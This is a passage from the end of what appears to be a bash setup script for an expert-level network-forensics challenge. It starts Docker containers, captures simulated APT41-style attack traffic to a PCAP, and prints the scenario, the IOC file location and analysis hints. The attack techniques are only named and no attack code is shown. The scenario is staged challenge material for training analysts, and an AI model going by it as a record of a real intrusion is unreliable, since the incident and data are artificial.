HR-WORKSTATION-01
FINANCE-PC-02
DEV-MACHINE-03
CORP-DC-01
FILE-SRV-01
EOF

chmod +x $CHALLENGE_DIR/scripts/*.sh

echo "Starting Enhanced APT Network Lab..."
cd $CHALLENGE_DIR

docker network prune -f

docker-compose up -d
sleep 45

echo "Checking container status..."
docker-compose ps

echo "Generating sophisticated APT attack traffic (3 minutes)..."
sleep 180

echo "Stopping traffic capture..."
docker-compose exec victim_ws1 pkill tcpdump 2>/dev/null || true
sleep 5

echo "Checking PCAP generation..."
PCAP_SIZE=$(docker-compose exec victim_ws1 ls -lh /opt/pcaps/network_capture.pcap 2>/dev/null | awk '{print $5}' || echo "Unknown")
PACKET_COUNT=$(docker-compose exec victim_ws1 tcpdump -r /opt/pcaps/network_capture.pcap 2>/dev/null | wc -l || echo "0")

echo ""
echo "=== ADVANCED APT NETWORK CHALLENGE READY ==="
echo "PCAP File: $CHALLENGE_DIR/pcaps/network_capture.pcap"
echo "File Size: $PCAP_SIZE"  
echo "Packet Count: $PACKET_COUNT"
echo ""
echo "=== SCENARIO ==="
echo "Multi-stage APT41 attack against enterprise network"
echo "Techniques: Advanced C2, supply chain attack, Kerberoasting, golden tickets"
echo "Data: HR records, financial data, executive compensation"
echo ""
echo "=== ANALYSIS RESOURCES ==="
echo "IOCs: $CHALLENGE_DIR/intel/comprehensive_iocs.txt"
echo ""
echo "=== CHALLENGE LEVEL: EXPERT ==="
echo "Requires advanced Wireshark/tshark skills"
echo "Expected analysis time: 2-4 hours"
echo ""

if [[ "$PACKET_COUNT" -gt 1000 ]]; then
    echo "✓ Advanced network traffic successfully generated!"
    echo "✓ Challenge ready for expert-level analysis!"
else
    echo "⚠ Warning: Low packet count - may need to extend capture time"
fi

echo ""
echo "To analyze: wireshark $CHALLENGE_DIR/pcaps/network_capture.pcap"
echo "Or use: tshark -r $CHALLENGE_DIR/pcaps/network_capture.pcap"

docker-compose down
